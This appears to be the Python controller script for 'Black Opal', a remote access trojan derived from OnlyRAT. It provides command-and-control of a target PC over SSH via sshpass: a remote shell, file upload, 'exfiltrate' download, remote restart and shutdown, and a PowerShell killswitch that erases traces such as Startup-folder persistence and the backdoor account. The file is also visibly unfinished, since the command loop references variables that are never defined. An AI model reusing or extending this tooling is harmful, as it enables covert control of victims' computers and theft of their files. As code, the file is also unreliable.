#!/usr/bin/python
# python console for Black Opal
# created by : Envxsion

# imports
import os
import sys
import getpass
import random as r
from datetime import datetime

# banner for display
banner = """

     ...     ..            ..                             ..                 ....                                         .. 
  .=*8888x <"?88h.   x .d88"                        < .z@8"`             .x~X88888Hx.                               x .d88"  
 X>  '8888H> '8888    5888R                          !@88E              H8X 888888888h.    .d``                      5888R   
'88h. `8888   8888    '888R         u           .    '888E   u         8888:`*888888888:   @8Ne.   .u         u      '888R   
'8888 '8888    "88>    888R      us888u.   .udR88N    888E u@8NL       88888:        `%8   %8888:u@88N     us888u.    888R   
 `888 '8888.xH888x.    888R   .@88 "8888" <888'888k   888E`"88*"     . `88888          ?>   `888I  888. .@88 "8888"   888R   
   X" :88*~  `*8888>   888R   9888  9888  9888 'Y"    888E .dN.      `. ?888%           X    888I  888I 9888  9888    888R   
 ~"   !"`      "888>   888R   9888  9888  9888        888E~8888        ~*??.            >    888I  888I 9888  9888    888R   
  .H8888h.      ?88    888R   9888  9888  9888        888E '888&      .x88888h.        <   uW888L  888' 9888  9888    888R   
 :"^"88888h.    '!    .888B . 9888  9888  ?8888u../   888E  9888.    :""'8888888x..  .x   '*88888Nu88P  9888  9888   .888B . 
 ^    "88888hx.+"     ^*888%  "888*""888"  "8888P'  '"888*" 4888"    `    `*888888888"    ~ '88888F`    "888*""888"  ^*888%  
        ^"**""          "%     ^Y"   ^Y'     "P'       ""    ""              ""***""         888 ^       ^Y"   ^Y'     "%    
                                                                                             ^8E                             
                                                                                             '8>                             
                                                                                                                           
                          

                 [::] The hues of the opal, are not to be seen if the eye is too near. [::]
                    [::] Created By : Envxsion [::]
"""

# help menu
help_menu = """
        [+] Arguments:
            -s, --setup --------------- Download Requirements for Black Opal 
            -m, --man ----------------- Black Opal Manual
            -v, --version ------------- Black Opal Version
            -u, --update -------------- Update Black Opal
            -r, --remove -------------- Uninstall Black Opal
            -h, --help  --------------- Help Menu
        [+] Example:
            blkopal -s
"""

# option menu
options_menu = """
        [+] Command and Control:
            [orconsole] -------------- Remote Console
            [upload] ----------------- Upload Files to Target PC
            [download] --------------- Download Files from Target PC
            [restart] ---------------- Restart Target PC
            [shutdown] --------------- Shutdown Target PC
            [killswitch] ------------- Removes Black Opal From Target
        [+] Payloads:
            
        [+] Options:
            [help] ------------------- Help Menu
            [man] -------------------- Black Opal Manual
            [version] ---------------- Version Number
            [update] ----------------- Update Black Opal
            [uninstall] -------------- Uninstall Black Opal
            [quit] ------------------- Quit
            * any other commands will be 
              sent through your terminal
        [*] Select an [option]...
"""
username = getpass.getuser() # gets username
header = f"[~] {username}@onlyrat $ " # sets up user input interface
remote_path = "raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main" # url path for OnlyRAT files
local_path = f"/home/{username}/.OnlyRAT" if username != "root" else "/root/.OnlyRAT" # gets path of OnlyRAT


# clear screen
def clear():
    #check if os is windows
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

# terminates program
def exit():
    print("\n[*] Exiting...")
    sys.exit()

# gets current date and time
def current_date():
    current = datetime.now()    

    return current.strftime("%m-%d-%Y_%H-%M-%S")



# connects rat to target
def connect(address, password, port):
    print("\n [*] Connecting to target...")

    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} -p {port}")

# remote uploads with SCP
def remote_upload(address, password, upload, path, port):

    print("\n[*] Starting Upload...")

    # scp upload
    os.system(f"sshpass -p \"{password}\" scp -P {port} -r {upload} onlyrat@{address}:{path}")

    print("[+] Upload complete\n")

# remote download with SCP
def remote_download(address, password, path, port):

    print("\n[*] Starting Download...")

    # scp download
    os.system("mkdir ~/Downloads")

    os.system(f"sshpass -p \"{password}\" scp -P {port} onlyrat@{address}:{path} ~/Downloads")

    print("[+] Download saved to \"~/Downloads\"\n")

# run commands remotely with SCP
def remote_command(address, password, command, port):

    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} -p {port} '{command}'")

# killswitch
def killswitch(address, password, working, username, port):
    print("\n[*] Prepping killswitch...")
    # web requests
    killswitch_command = f"powershell /c Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/onlyrat\" -r -Force; Remove-LocalUser -Name \"onlyrat\"; shutdown /r"
    print("[+] Killswitch prepped")

    # installing killswitch
    print("[*] Executing killswitch...")
    remote_command(address, password, f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && del *.cmd", port)
    remote_command(address, password, killswitch_command, port)
    print("[+] Killswitch Executed sucessfully\n")
       
    # execute logger
    print("\n[*] Restarting target computer...")

# custom upload
def upload(address, password, working, port):

    # get upload file
    print("\n[~] Enter file you wish to upload :")
    upload_file = input(header)

    # upload file
    print("\n[*] Uploading...")
    remote_upload(address, password, upload_file, working, port)
    print(f"[+] Uploaded sucessfully to \"{working}\"\n")

# custom download
def download(address, password, port):

    # get download path
    print("\n[~] Enter path of file you wish to download :")
    download_file = input(header)

    # download file
    print("\n[*] Downloading...")
    remote_download(address, password, download_file, port)

# update OnlyRAT
def update():

    print("\n[*] Checking for updates...")

    # get latest version nubmer
    os.system(f"curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")

    # save version nubmers to memory
    current_version = float(open(f"{local_path}/version.txt", "r").read())
    latest_version = float(open(f"{local_path}/latest.txt", "r").read())

    # remove version number file
    os.system("rm -rf ~/.OnlyRAT/latest.txt")

    # if new version is available, update
    if latest_version > current_version:
        print("\n[+] Update found")
        print("[~] Update Onlyrat? [y/n]\n")

        # user input, option
        option = input(f"{header}")
        
        # update
        if option == "y":
            os.system(f"bash ~/.OnlyRAT/payloads/update.sh")

        # exception
        # else:
        #     main()

    # otherwise, run main code
    else:
        print("\n[+] OnlyRAT already up to date")
        print("[*] Hit any key to continue...\n")
        input(header)
        #main()

# uninstalls onlyrat
def remove():
    # confirmation
    print("\n[~] Are you sure you want to remove OnlyRAT [y/n]\n")

    # user input
    option = input(header)

    # delete OnlyRAT
    if option == "y":
        os.system("rm -rf ~/.OnlyRAT")

    # cancel
    if option == "n":
        main()


# command line interface
def cli(arguments):
    # display banner
    clear()

    print(banner)

    # if arguments exist
    if arguments:

        argument = sys.argv[1]

        

            # loop user input
        while True:
            # user input, option
            option = input(header)
            
            # remote console
            if option == "orconsole":
                connect(ipv4, password, port)
            # custom upload
            elif option == "upload":
                upload(ipv4, password, working_direcory, port)
            # custom download
            elif option == "download" or option == "exfiltrate":
                download(ipv4, password, port)
            # restart target option
            elif option == "restart":
                remote_command(ipv4, password, "shutdown /r", port)
                
            # shutdown target option
            elif option == "shutdown":
                remote_command(ipv4, password, "shutdown", port)
            # help menu
            elif option == "help":
                print(banner)
                print(options_menu)
            # display config file info
            elif option == "config":
                print_config(configuration)
                print(f"USERNAME : {target_username}")
            
            # get version number
            elif option == "version":
                os.system(f"cat {local_path}/version.txt")
            # update option
            elif option == "update":
                update()
                exit()
            # kill switch
            elif option == "killswitch":
                print("\n[~] Are you sure you want to remove OnlyRAT from your target [y/n")
                confirm = input(header)
                if confirm == "y":
                    killswitch(ipv4, password, working_direcory, target_username, port)
                else:
                    main()
            # onlyrat manual
            elif option == "man" or option == "manual":
                os.system(f"xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
            # remove installation
            elif option == "remove" or option == "uninstall":
                remove()
            # quit option
            elif option == "quit" or option == "exit":
                exit()
            # exception
            else:
                os.system(option)
            
            # new line for cleaner UI
            print("\n")

        

    # if arguments don't exist
    else:
        print(help_menu)

# main code
def main():
    
    # clear screen
    clear()

    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True

    # run command line interface
    cli(arguments_exist)

# runs main code
if __name__ == "__main__":
    # runs main function
    main()